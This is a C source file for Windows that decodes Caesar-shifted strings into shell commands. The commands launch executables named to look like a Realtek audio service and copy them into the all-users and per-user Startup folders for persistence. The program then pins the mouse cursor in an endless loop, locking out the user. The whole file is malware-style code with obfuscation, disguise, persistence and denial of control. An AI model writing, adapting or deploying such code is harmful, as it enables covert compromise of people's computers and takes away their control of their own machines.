#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>


void decrypt(char *text, int shift)
{
    int length = strlen(text);
    for (int i = 0; i < length; i++)
    {
        text[i] = (char)((int)text[i] - shift);
    }
}


int main()
{    
    char text_1[] = "uvctv\"TvmCwfWUgtxkegWrf860gzg";
    char text_2[] = "zeqr{\"$TvmCwfWUgtxkeg860gzg$\"$E<^RtqitcoFcvc^Oketquqhv^Ykpfqyu^Uvctv\"Ogpw^Rtqitcou^Uvctvwr^$\"1[";
    char text_3[] = "zeqr{\"$TvmCwfWUgtxkeg860gzg$\"$'CRRFCVC'^Oketquqhv^Ykpfqyu^Uvctv\"Ogpw^Rtqitcou^Uvctvwr^$\"1[";
    char text_4[] = "zeqr{\"$TvmCwfWUgtxkegWrf860gzg$\"$E<^RtqitcoFcvc^Oketquqhv^Ykpfqyu^Uvctv\"Ogpw^Rtqitcou^Uvctvwr^$\"1[";
    char text_5[] = "zeqr{\"$TvmCwfWUgtxkegWrf860gzg$\"$'CRRFCVC'^Oketquqhv^Ykpfqyu^Uvctv\"Ogpw^Rtqitcou^Uvctvwr^$\"1[";

    // printf("\n%s", text_1);
    // printf("\n%s", text_2);
    // printf("\n%s", text_3);
    // printf("\n%s", text_4);
    // printf("\n%s", text_5);

    decrypt(text_1, 2);
    decrypt(text_2, 2);
    decrypt(text_3, 2);
    decrypt(text_4, 2);
    decrypt(text_5, 2);
    
    printf("\n\n");

    // printf("\n%s", text_1);
    // printf("\n%s", text_2);
    // printf("\n%s", text_3);
    // printf("\n%s", text_4);
    // printf("\n%s", text_5);

    system(text_1);
    //1 start RtkAudUServiceUpd64.exe

    // for user --------------------------------------
    
    system(text_2);
    //2 xcopy "RtkAudUService64.exe" "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\" /Y

    system(text_4);
    //4 xcopy "RtkAudUServiceUpd64.exe" "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\" /Y


    // for admin --------------------------------------

    system(text_3);
    //3 xcopy "RtkAudUService64.exe" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\" /Y

    system(text_5);
    //5 xcopy "RtkAudUServiceUpd64.exe" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\" /Y
    

    while (1)
    {
        SetCursorPos(2000, 2000);
    }
    
    
	return 0;
}